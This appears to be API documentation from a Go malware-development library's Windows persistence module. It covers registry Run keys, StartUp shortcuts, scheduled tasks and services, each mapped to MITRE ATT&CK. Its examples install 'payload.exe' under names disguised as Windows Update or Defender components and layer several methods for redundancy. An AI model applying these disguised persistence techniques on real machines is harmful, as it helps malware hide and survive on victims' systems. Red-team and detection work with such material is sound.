# Persistence APIs

[<- Back to README](../README.md)

The `persistence/` module provides composable persistence mechanisms for Windows. Every sub-package exports both standalone functions and a `Mechanism` constructor that satisfies the `persistence.Mechanism` interface, enabling redundant multi-method persistence with a single `InstallAll` call.

## Packages

| Package | Technique | MITRE ATT&CK | Platform |
|---------|-----------|---------------|----------|
| `persistence/registry` | Registry Run/RunOnce keys | T1047.001 -- Boot or Logon Autostart Execution | Windows |
| `persistence/startup` | StartUp folder LNK shortcuts | T1547.009 -- Shortcut Modification | Windows |
| `persistence/scheduler` | Task Scheduler via schtasks.exe | T1053.005 -- Scheduled Task | Windows |
| `persistence/service` | Windows Service via SCM | T1543.003 -- Windows Service | Windows |

---

## Core Interface (`persistence`)

```go
// Mechanism is a persistence technique that can be installed and removed.
type Mechanism interface {
    Name() string
    Install() error
    Uninstall() error
    Installed() (bool, error)
}
```

Every sub-package exports a constructor that returns a `Mechanism` value:

| Package | Constructor | Mechanism Name |
|---------|-------------|----------------|
| `persistence/registry` | `RunKey(hive, keyType, name, value)` | `registry:HKCU:Run` (varies) |
| `persistence/startup` | `Shortcut(name, targetPath, args)` | `startup:user` |
| `persistence/scheduler` | `ScheduledTask(task)` | `scheduler:<taskName>` |
| `persistence/service` | `Service(cfg)` | `service:<serviceName>` |

### `InstallAll`

```go
func InstallAll(mechanisms []Mechanism) map[string]error
```

**Purpose:** Activates every mechanism in order. Returns a map of mechanism name to error for any that failed, or `nil` if all succeeded.

### `UninstallAll`

```go
func UninstallAll(mechanisms []Mechanism) map[string]error
```

**Purpose:** Removes every mechanism in order. Same return semantics as `InstallAll`.

**Example -- Redundant persistence:**

```go
import (
    "github.com/oioio-space/maldev/persistence"
    "github.com/oioio-space/maldev/persistence/registry"
    "github.com/oioio-space/maldev/persistence/startup"
    "github.com/oioio-space/maldev/persistence/scheduler"
)

mechanisms := []persistence.Mechanism{
    registry.RunKey(registry.HiveCurrentUser, registry.KeyRun, "WindowsUpdate", `C:\Temp\payload.exe`),
    startup.Shortcut("WindowsUpdate", `C:\Temp\payload.exe`, ""),
    scheduler.ScheduledTask(&scheduler.Task{
        Name:    `Microsoft\Windows\Update\Check`,
        Command: `C:\Temp\payload.exe`,
        Trigger: scheduler.TriggerLogon,
    }),
}

errs := persistence.InstallAll(mechanisms)
if errs != nil {
    for name, err := range errs {
        log.Printf("persistence %s failed: %v", name, err)
    }
}
```

---

## persistence/registry -- Registry Run/RunOnce Keys

Package `registry` manages persistence via the Windows registry Run and RunOnce keys. Values written to these keys are executed automatically when the user logs on (HKCU) or when the system starts (HKLM).

**MITRE ATT&CK:** T1047.001 (Boot or Logon Autostart Execution: Registry Run Keys)
**Platform:** Windows
**Detection:** Medium -- Run keys are well-known persistence locations monitored by most EDR products.

### Types

#### `Hive`

```go
type Hive int

const (
    HiveCurrentUser  Hive = iota // HKCU -- per-user, no elevation required
    HiveLocalMachine             // HKLM -- machine-wide, requires elevation
)
```

#### `KeyType`

```go
type KeyType int

const (
    KeyRun     KeyType = iota // Persistent across reboots
    KeyRunOnce                // Deleted after first execution
)
```

#### `RunKeyMechanism`

Implements `persistence.Mechanism`. Created via `RunKey()`.

### Errors

```go
var ErrNotFound = errors.New("registry value not found")
```

### Functions

#### `Set`

```go
func Set(hive Hive, keyType KeyType, name, value string) error
```

**Purpose:** Creates or updates a string value in the specified Run/RunOnce key.

**Parameters:**
- `hive` -- `HiveCurrentUser` (HKCU) or `HiveLocalMachine` (HKLM).
- `keyType` -- `KeyRun` (persistent) or `KeyRunOnce` (one-shot).
- `name` -- Registry value name (appears in Autoruns as the entry name).
- `value` -- Command line to execute (typically an executable path).

**Registry paths:**
- `KeyRun`: `Software\Microsoft\Windows\CurrentVersion\Run`
- `KeyRunOnce`: `Software\Microsoft\Windows\CurrentVersion\RunOnce`

---

#### `Get`

```go
func Get(hive Hive, keyType KeyType, name string) (string, error)
```

**Purpose:** Retrieves a string value from the specified Run/RunOnce key. Returns `ErrNotFound` if the value does not exist.

---

#### `Delete`

```go
func Delete(hive Hive, keyType KeyType, name string) error
```

**Purpose:** Removes a value from the specified Run/RunOnce key.

---

#### `Exists`

```go
func Exists(hive Hive, keyType KeyType, name string) (bool, error)
```

**Purpose:** Checks whether a value exists in the specified Run/RunOnce key.

---

#### `RunKey`

```go
func RunKey(hive Hive, keyType KeyType, name, value string) *RunKeyMechanism
```

**Purpose:** Returns a `persistence.Mechanism` that manages a Run/RunOnce registry value.

**Example:**

```go
import "github.com/oioio-space/maldev/persistence/registry"

// User-level persistence via Run key
err := registry.Set(registry.HiveCurrentUser, registry.KeyRun, "Updater", `C:\Temp\updater.exe`)

// Or use the Mechanism interface
m := registry.RunKey(registry.HiveCurrentUser, registry.KeyRun, "Updater", `C:\Temp\updater.exe`)
m.Install()
```

---

## persistence/startup -- StartUp Folder LNK Shortcuts

Package `startup` manages persistence via Windows StartUp folder shortcuts. Creates `.lnk` files that execute the target binary when the user logs on. Uses `system/lnk` for COM-based shortcut creation.

**MITRE ATT&CK:** T1547.009 (Shortcut Modification)
**Platform:** Windows
**Detection:** Medium -- StartUp folder is a well-known persistence location.

### Functions

#### `UserDir`

```go
func UserDir() (string, error)
```

**Purpose:** Returns the current user's Startup folder path (`AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`).

---

#### `MachineDir`

```go
func MachineDir() (string, error)
```

**Purpose:** Returns the machine-wide Startup folder path (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`).

---

#### `Install`

```go
func Install(name, targetPath, args string) error
```

**Purpose:** Creates a `.lnk` shortcut in the user's Startup folder.

**Parameters:**
- `name` -- Shortcut filename (without `.lnk` extension).
- `targetPath` -- Executable to run at logon.
- `args` -- Optional command-line arguments.

---

#### `InstallMachine`

```go
func InstallMachine(name, targetPath, args string) error
```

**Purpose:** Creates a `.lnk` shortcut in the machine-wide Startup folder. Requires elevated privileges.

---

#### `Remove` / `RemoveMachine`

```go
func Remove(name string) error
func RemoveMachine(name string) error
```

**Purpose:** Removes a shortcut from the user or machine Startup folder.

---

#### `Exists`

```go
func Exists(name string) bool
```

**Purpose:** Checks if a shortcut exists in the user's Startup folder.

---

#### `Shortcut`

```go
func Shortcut(name, targetPath, args string) *ShortcutMechanism
```

**Purpose:** Returns a `persistence.Mechanism` for managing a StartUp folder shortcut.

**Example:**

```go
import "github.com/oioio-space/maldev/persistence/startup"

err := startup.Install("WindowsUpdate", `C:\Temp\payload.exe`, "")
```

---

## persistence/scheduler -- Task Scheduler

Package `scheduler` manages persistence via the Windows Task Scheduler. Creates, deletes, and queries scheduled tasks using `schtasks.exe` with a hidden console window.

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job: Scheduled Task)
**Platform:** Windows
**Detection:** Medium -- scheduled tasks are logged in Security event log (Event ID 4698).

### Types

#### `Trigger`

```go
type Trigger int

const (
    TriggerLogon   Trigger = iota // Run at user logon (requires elevation)
    TriggerStartup                // Run at system startup (requires elevation)
    TriggerDaily                  // Run daily
)
```

#### `Task`

```go
type Task struct {
    Name    string  // Task name (supports backslash for folders: "Folder\TaskName")
    Command string  // Command to execute
    Args    string  // Command-line arguments
    Trigger Trigger // When to run
}
```

### Errors

```go
var (
    ErrTaskCreate = errors.New("failed to create scheduled task")
    ErrTaskDelete = errors.New("failed to delete scheduled task")
)
```

### Functions

#### `Create`

```go
func Create(ctx context.Context, task *Task) error
```

**Purpose:** Registers a scheduled task via `schtasks.exe /Create`.

**Parameters:**
- `ctx` -- Context for cancellation.
- `task` -- Task configuration. The command path is automatically quoted to handle spaces.

**How it works:** Builds `schtasks.exe` arguments (`/Create /TN /TR /SC /F`) and executes with `HideWindow: true`.

---

#### `Delete`

```go
func Delete(ctx context.Context, name string) error
```

**Purpose:** Removes a scheduled task via `schtasks.exe /Delete /F`.

---

#### `Exists`

```go
func Exists(ctx context.Context, name string) bool
```

**Purpose:** Checks if a scheduled task exists via `schtasks.exe /Query /TN`.

---

#### `ScheduledTask`

```go
func ScheduledTask(task *Task) *TaskMechanism
```

**Purpose:** Returns a `persistence.Mechanism` for managing a scheduled task.

**Example:**

```go
import (
    "context"
    "github.com/oioio-space/maldev/persistence/scheduler"
)

task := &scheduler.Task{
    Name:    `Microsoft\Windows\NetTrace\GatherNetworkInfo`,
    Command: `C:\Temp\payload.exe`,
    Args:    "-silent",
    Trigger: scheduler.TriggerLogon,
}

err := scheduler.Create(context.Background(), task)
```

---

## persistence/service -- Windows Service

Package `service` manages persistence via Windows services. Creates, controls, and removes services through the Service Control Manager (SCM) using `golang.org/x/sys/windows/svc/mgr`.

**MITRE ATT&CK:** T1543.003 (Create or Modify System Process: Windows Service)
**Platform:** Windows
**Detection:** High -- service creation generates event log entries (Event ID 4697, 7045).

### Types

#### `StartType`

```go
type StartType uint32

const (
    StartAuto    StartType = iota // Start at boot (SERVICE_AUTO_START)
    StartDelayed                  // Start after boot delay (auto + delayed)
    StartManual                   // Manual start only
)
```

#### `Config`

```go
type Config struct {
    Name        string    // Service name (internal identifier)
    DisplayName string    // Human-readable display name
    Description string    // Service description
    BinPath     string    // Full path to the service executable
    Args        string    // Command-line arguments (appended to BinPath)
    StartType   StartType // When the service starts
}
```

### Errors

```go
var (
    ErrServiceExists   = errors.New("service already exists")
    ErrServiceNotFound = errors.New("service not found")
    ErrAccessDenied    = errors.New("access denied")
)
```

### Functions

#### `Install`

```go
func Install(cfg *Config) error
```

**Purpose:** Creates a Windows service with the given configuration. Requires administrator privileges.

**Parameters:**
- `cfg` -- Service configuration. `Name` and `BinPath` are required.

**How it works:** Connects to the SCM, calls `CreateService` with the mapped start type, and optionally sets the delayed auto-start flag.

---

#### `Uninstall`

```go
func Uninstall(name string) error
```

**Purpose:** Removes a Windows service by name. Stops the service first if it is running (best-effort stop with 10-second timeout).

---

#### `Exists`

```go
func Exists(name string) bool
```

**Purpose:** Checks if a Windows service exists by attempting to open it via the SCM.

---

#### `IsRunning`

```go
func IsRunning(name string) bool
```

**Purpose:** Checks if a named service is currently in the `Running` state.

---

#### `Start`

```go
func Start(name string) error
```

**Purpose:** Starts a named service.

---

#### `Stop`

```go
func Stop(name string) error
```

**Purpose:** Stops a named service. Waits up to 10 seconds for the service to reach the stopped state.

---

#### `Service`

```go
func Service(cfg *Config) *Mechanism
```

**Purpose:** Returns a `persistence.Mechanism` for managing a Windows service.

**Example:**

```go
import "github.com/oioio-space/maldev/persistence/service"

cfg := &service.Config{
    Name:        "WinDefenderUpdate",
    DisplayName: "Windows Defender Update Service",
    Description: "Provides real-time protection updates.",
    BinPath:     `C:\Temp\payload.exe`,
    StartType:   service.StartDelayed,
}

err := service.Install(cfg)
```
